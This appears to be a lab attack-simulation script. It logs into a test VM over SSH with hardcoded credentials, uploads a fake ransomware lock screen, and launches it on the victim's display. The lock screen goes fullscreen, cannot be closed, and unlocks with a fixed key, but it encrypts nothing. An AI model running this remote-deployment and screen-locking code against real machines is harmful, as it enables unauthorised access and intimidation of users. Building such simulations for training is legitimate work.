#!/usr/bin/env python3
import sys
import paramiko

# --- LAB CREDENTIALS ---
TARGET_IP = "172.16.1.100" # The hardened Kali VM
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def main():
    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")

    # The Tkinter Payload with Frame switching and forced focus
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time
import subprocess
import threading

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

def show_lock_screen():
    prompt_frame.pack_forget()
    lock_frame.pack(expand=True, fill='both')

def show_prompt_screen():
    lock_frame.pack_forget()
    prompt_frame.pack(expand=True, fill='both')
    
    # Force the window manager to give focus to our application
    root.focus_force()
    entry.focus_set()
    
    # Use xdotool to force the window to become active so we can type
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowactivate"], check=False)
    except Exception:
        pass

def check_password():
    if entry.get() == "Ransomware2026!":
        prompt_frame.pack_forget()
        lbl.config(text="Decrypting...")
        lock_frame.pack(expand=True, fill='both')
        root.update()
        for i in range(0, 101, 10):
            lbl.config(text=f"Decrypting your files... {i}%")
            root.update()
            time.sleep(0.2)
        root.destroy()
    else:
        # On incorrect password, flash red and clear the entry
        entry.delete(0, tk.END)
        prompt_frame.configure(bg="darkred")
        prompt_frame.update()
        time.sleep(0.3)
        prompt_frame.configure(bg="black")

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

# --- FRAME 1: The Lock Screen ---
lock_frame = tk.Frame(root, bg="black")
lock_frame.pack(expand=True, fill='both')

lbl = tk.Label(lock_frame, text="Your Kali files have been simulated-encrypted!\\nClick below to end.", 
               fg="lime", bg="black", font=("Courier", 30, "bold"))
lbl.pack(expand=True, fill='both')

btn = tk.Button(lock_frame, text="Pay Ransom", command=show_prompt_screen, 
                bg="darkred", fg="white", font=("Courier", 20, "bold"))
btn.pack(side="bottom", pady=50)

# --- FRAME 2: The Prompt Screen ---
prompt_frame = tk.Frame(root, bg="black")

prompt_lbl = tk.Label(prompt_frame, text="Enter the decryption key to unlock your files:", 
                      fg="lime", bg="black", font=("Courier", 24, "bold"))
prompt_lbl.pack(expand=True, fill='both')

entry = tk.Entry(prompt_frame, show="*", font=("Courier", 20), width=20)
entry.pack(pady=20)

submit_btn = tk.Button(prompt_frame, text="Decrypt", command=check_password, 
                       bg="darkred", fg="white", font=("Courier", 20, "bold"))
submit_btn.pack(pady=20)

entry.bind('<Return>', lambda event: check_password())

root.protocol("WM_DELETE_WINDOW", lambda: None)

threading.Thread(target=force_fullscreen, daemon=True).start()

root.mainloop()
"""

    try:
        print("[*] Connecting via SSH...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
        
        print("[*] Uploading payload to /tmp/ransom_sim.py...")
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        print("[*] Triggering GUI using active Xauthority...")
        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        
        ssh.exec_command(exec_cmd)
        
        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
        ssh.close()

    except paramiko.AuthenticationException:
        print("[-] Authentication failed. Check your credentials.")
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
